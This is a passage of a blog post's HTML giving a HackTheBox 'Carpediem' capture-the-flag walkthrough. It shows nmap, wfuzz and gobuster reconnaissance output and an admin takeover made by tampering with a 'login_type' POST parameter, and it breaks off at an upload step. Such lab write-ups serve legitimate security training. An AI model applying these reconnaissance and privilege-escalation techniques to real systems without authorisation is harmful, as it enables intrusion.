@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Carpediem - Saad Akhtar</title><meta name="Description" content="HackTheBox hard linux machine Carpediem walkthrough."><meta property="og:title" content="HackTheBox - Carpediem" />
+<meta property="og:description" content="HackTheBox hard linux machine Carpediem walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-carpediem/" /><meta property="og:image" content="/hackthebox-carpediem/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-03T11:00:21+05:00" />
+<meta property="article:modified_time" content="2022-12-03T11:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-carpediem/0.png"/>
+<meta name="twitter:title" content="HackTheBox - Carpediem"/>
+<meta name="twitter:description" content="HackTheBox hard linux machine Carpediem walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-carpediem/" /><link rel="prev" href="/hackthebox-shared/" /><link rel="next" href="/cryptohack-challenges-general-encoding/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Carpediem",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-carpediem\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-carpediem\/0.png",
+                            "width":  1400 ,
+                            "height":  1060 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  3649 ,
+        "url": "\/hackthebox-carpediem\/","datePublished": "2022-12-03T11:00:21+05:00","dateModified": "2022-12-03T11:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox hard linux machine Carpediem walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Carpediem</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-03">2022-12-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3649 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-carpediem/0.png"
+        data-srcset="/hackthebox-carpediem/0.png, /hackthebox-carpediem/0.png 1.5x, /hackthebox-carpediem/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-carpediem/0.png"
+        title="HackTheBox hard linux machine Carpediem walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#portalcarpediemhtb">portal.carpediem.htb</a></li>
+        <li><a href="#promoting-yourself-to-admin">Promoting yourself to admin</a></li>
+        <li><a href="#leveraging-the-vulnerable-upload-functionality">Leveraging the vulnerable upload functionality</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#analyzing-the-internal-network">Analyzing the internal network</a></li>
+        <li><a href="#enumerating-the-discovered-services">Enumerating the discovered services</a></li>
+        <li><a href="#infiltrating-using-mongodb-and-trudesk">Infiltrating using mongodb and trudesk.</a></li>
+        <li><a href="#listening-to-the-credentials">Listening to the credentials</a></li>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#analyzing-the-https-traffic">Analyzing the https traffic</a></li>
+        <li><a href="#ssh-tunneling">SSH tunneling</a></li>
+        <li><a href="#exploiting-backdrop-cms">Exploiting Backdrop CMS</a></li>
+        <li><a href="#shell-as-www-data-on-1721702">Shell as www-data on 172.17.0.2</a></li>
+        <li><a href="#www-data---root-in-the-same-container">www-data -&gt; root in the same container</a></li>
+        <li><a href="#escaping-the-privileged-docker-container">Escaping the privileged docker container</a></li>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Hard Linux Machine Carpediem from HackTheBox.</p>
+<h2 id="summary">Summary</h2>
+<p>Carpediem from HackTheBox, a hard linux machine. Here we get an interesting subdomain from fuzzing in which we can make an account and due to some misconfigurations elevate our low privilege user to admin user. From there we get access to the admin panel, where we abuse the upload functionality to get the initial foothold on the machine. In the docker container we&rsquo;re in, we scan the internal network and discover a bunch of services. From these services, we expose a trudesk login panel and mongodb. Having full control of the mongodb, we update a user entry to add a custom password and login as that user. Looking through different tickets and mails, we discover the method to get credentials from Zoiper client and login as <code>hflaccus</code> to get the <code>user.txt</code>. For privesc, we first utilize <code>tcpdump</code> to capture the <code>https</code> traffic and analyze it using the ssl cert key in <code>wireshark</code>. Here we get credentials for the <code>backdrop CMS</code> where we exploit a vulnerability to get shell as <code>www-data</code> in a container which we elevate to <code>root</code> and finally escape the docker to get <code>root</code> on the actual machine.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.11.167 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu1cI0YwetA1ogbtnmphJGBauZ9QMAFq5bAB5hXPJHo3juauB1ZE+fr+JYoWzt0dVoWONbGlmVE3t8udy73OQRLePqRcSqEC4PicOCDFwh3elJt0XuGC16nQJ7bu2++vWEdJb22erkKomy/qiUsDFBg/D+lUQkVo97JxJ9WarEzYVi21cOjcKIDqpXVQMjSuqsXZLSEz34uLnhZs1L7DeeT9V5H1B45Ev59N3VTQAM0bt6MOTfTqOfVQdzlYFl5VLWlZg3UkhZWQ6+Y4jeWKvSp6qviEfgHcaslUTO3WCMs/tYHIdAcxEE4XoCHfLaxHgI9s8hBWyma3ERw3aAX1iqv0UjnaGBSgd6Gght6m+FE8OlqhpUJllFeI31Sbs2aI8O/foxJ3QJcrAiM1ws0ZG7fJ/5vzEB0k1+T1tU9DfX4kgpiWL+reny+4s1bIKNo3OydiCCFBwe1DVOcqWyBz1TZp+ySPG6Pbw11+ZM15oeHeBK8rvVBep+wVJBB8aQ65k<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDdWYORigZRc9jSYZXZoTVpmvPD3h0bFyZ7rIPxq+IbykLHWRUFr4sClke/0p+B54VI5PfJOe9nFDjkHfygPfa8<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMyrIUnr3oGuEz3jkFdLlCXtY3qcUXoJ1cOL1arYAxBM
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Comming Soon
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With only 2 ports open, let&rsquo;s go for port <code>80</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/1.png" title="Website on port 80" data-thumbnail="/hackthebox-carpediem/1.png" data-sub-html="<h2>Website on port 80</h2><p>Website on port 80</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/1.png"
+            data-srcset="/hackthebox-carpediem/1.png, /hackthebox-carpediem/1.png 1.5x, /hackthebox-carpediem/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/1.png" width="1920" height="868" />
+    </a><figcaption class="image-caption">Website on port 80</figcaption>
+    </figure></p>
+<p>There&rsquo;s nothing much to do in this website. Directory brute-forcing also didn&rsquo;t give much.</p>
+<p>So checking for virtual hosts for <code>carpediem.htb</code> we got a subdomain <code>portal.carpediem.htb</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ wfuzz -c -f sub-fighter -w /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -u <span class="s1">&#39;http://carpediem.htb&#39;</span> -H <span class="s2">&#34;Host: FUZZ.carpediem.htb&#34;</span>  --hh <span class="m">2875</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://carpediem.htb/
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">4989</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000048:   <span class="m">200</span>        <span class="m">462</span> L    <span class="m">2174</span> W     <span class="m">31090</span> Ch    <span class="s2">&#34;portal&#34;</span>                                                                                                                                                                   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total time: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">4989</span>
+</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">4988</span>
+</span></span><span class="line"><span class="cl">Requests/sec.: <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="portalcarpediemhtb">portal.carpediem.htb</h3>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/2.png" title="portal.carpediem.htb" data-thumbnail="/hackthebox-carpediem/2.png" data-sub-html="<h2>portal.carpediem.htb</h2><p>portal.carpediem.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/2.png"
+            data-srcset="/hackthebox-carpediem/2.png, /hackthebox-carpediem/2.png 1.5x, /hackthebox-carpediem/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/2.png" width="1920" height="869" />
+    </a><figcaption class="image-caption">portal.carpediem.htb</figcaption>
+    </figure></p>
+<p>I tried directory brute-forcing here as well and got the following results.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://portal.carpediem.htb/ -w /usr/share/wordlists/dirb/common.txt -o dirPortal
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 285<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 285<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 285<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 328<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/admin/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 329<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/assets/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/build                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 328<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/build/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/classes              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 330<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/classes/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/dist                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 327<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/dist/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/inc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/inc/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 31090<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/libs                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 327<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/libs/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 330<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/plugins/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 285<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 330<span class="o">]</span> <span class="o">[</span>--&gt; http://portal.carpediem.htb/uploads/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">4614</span> / <span class="m">4615</span> <span class="o">(</span>99.98%<span class="o">)===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/10/31 10:15:24 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a few interesting dirs here. But <code>/uploads</code> is currently forbidden and we also don&rsquo;t have access to <code>/admin</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/8.png" title="/uploads" data-thumbnail="/hackthebox-carpediem/8.png" data-sub-html="<h2>/uploads</h2><p>/uploads</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/8.png"
+            data-srcset="/hackthebox-carpediem/8.png, /hackthebox-carpediem/8.png 1.5x, /hackthebox-carpediem/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/8.png" width="1920" height="862" />
+    </a><figcaption class="image-caption">/uploads</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/7.png" title="/admin" data-thumbnail="/hackthebox-carpediem/7.png" data-sub-html="<h2>/admin</h2><p>/admin</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/7.png"
+            data-srcset="/hackthebox-carpediem/7.png, /hackthebox-carpediem/7.png 1.5x, /hackthebox-carpediem/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/7.png" width="1920" height="870" />
+    </a><figcaption class="image-caption">/admin</figcaption>
+    </figure></p>
+<p>Let&rsquo;s dig in further.</p>
+<p>From the main page, we have login option, but since we don&rsquo;t have any credentials yet so I created an account to check the further functionality.</p>
+<p>After loggin in, when we go to our profile on the following url <code>http://portal.carpediem.htb/?p=my_account</code>, we can see a <code>Manage Account</code> button.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/3.png" title="Profile Page" data-thumbnail="/hackthebox-carpediem/3.png" data-sub-html="<h2>Profile Page</h2><p>Profile Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/3.png"
+            data-srcset="/hackthebox-carpediem/3.png, /hackthebox-carpediem/3.png 1.5x, /hackthebox-carpediem/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/3.png" width="1920" height="869" />
+    </a><figcaption class="image-caption">Profile Page</figcaption>
+    </figure></p>
+<p>Here we get a page to edit our account details.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/4.png" title="Edit Account Page" data-thumbnail="/hackthebox-carpediem/4.png" data-sub-html="<h2>Edit Account</h2><p>Edit Account Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/4.png"
+            data-srcset="/hackthebox-carpediem/4.png, /hackthebox-carpediem/4.png 1.5x, /hackthebox-carpediem/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/4.png" width="1919" height="868" />
+    </a><figcaption class="image-caption">Edit Account</figcaption>
+    </figure></p>
+<p>Going further down we can also update our details.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/5.png" title="Update Details" data-thumbnail="/hackthebox-carpediem/5.png" data-sub-html="<h2>Update Details</h2><p>Update Details</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/5.png"
+            data-srcset="/hackthebox-carpediem/5.png, /hackthebox-carpediem/5.png 1.5x, /hackthebox-carpediem/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/5.png" width="1919" height="865" />
+    </a><figcaption class="image-caption">Update Details</figcaption>
+    </figure></p>
+<h3 id="promoting-yourself-to-admin">Promoting yourself to admin</h3>
+<p>On capturing the request for update details on <code>burp</code>, we have a <code>POST</code> parameter <code>login_type</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/6.png" title="Update Details Request" data-thumbnail="/hackthebox-carpediem/6.png" data-sub-html="<h2>Update Details Request</h2><p>Update Details Request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/6.png"
+            data-srcset="/hackthebox-carpediem/6.png, /hackthebox-carpediem/6.png 1.5x, /hackthebox-carpediem/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/6.png" width="1920" height="805" />
+    </a><figcaption class="image-caption">Update Details Request</figcaption>
+    </figure></p>
+<p>Changing the value of <code>login_type</code> from <code>2</code> to <code>1</code>. It still returns a <code>success</code> message.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/9.png" title="success status" data-thumbnail="/hackthebox-carpediem/9.png" data-sub-html="<h2>success status</h2><p>success status</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/9.png"
+            data-srcset="/hackthebox-carpediem/9.png, /hackthebox-carpediem/9.png 1.5x, /hackthebox-carpediem/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/9.png" width="1920" height="807" />
+    </a><figcaption class="image-caption">success status</figcaption>
+    </figure></p>
+<p>Visiting the <code>/admin</code> endpoint, we can now access it.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/10.png" title="Admin Panel" data-thumbnail="/hackthebox-carpediem/10.png" data-sub-html="<h2>Admin Panel</h2><p>Admin Panel</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/10.png"
+            data-srcset="/hackthebox-carpediem/10.png, /hackthebox-carpediem/10.png 1.5x, /hackthebox-carpediem/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/10.png" width="1919" height="869" />
+    </a><figcaption class="image-caption">Admin Panel</figcaption>
+    </figure></p>
+<h3 id="leveraging-the-vulnerable-upload-functionality">Leveraging the vulnerable upload functionality</h3>
+<p>Looking around on the Quaterly Sales Report page at <code>http://portal.carpediem.htb/admin/?page=maintenance/files</code> there&rsquo;s a message.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/12.png" title="Note" data-thumbnail="/hackthebox-carpediem/12.png" data-sub-html="<h2>Note</h2><p>Note</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/12.png"
+            data-srcset="/hackthebox-carpediem/12.png, /hackthebox-carpediem/12.png 1.5x, /hackthebox-carpediem/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/12.png" width="1920" height="871" />
+    </a><figcaption class="image-caption">Note</figcaption>
+    </figure></p>
+<p>This could mean that we can abuse the upload functionality here.</p>
+<p>Attempting to check the <code>Add</code> button in the same page we can see the <code>upload</code> function calling which might be vulnerable as stated above.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/13.png" title="Add Feature" data-thumbnail="/hackthebox-carpediem/13.png" data-sub-html="<h2>Add Feature</h2><p>Add Feature</p>">
+        <img
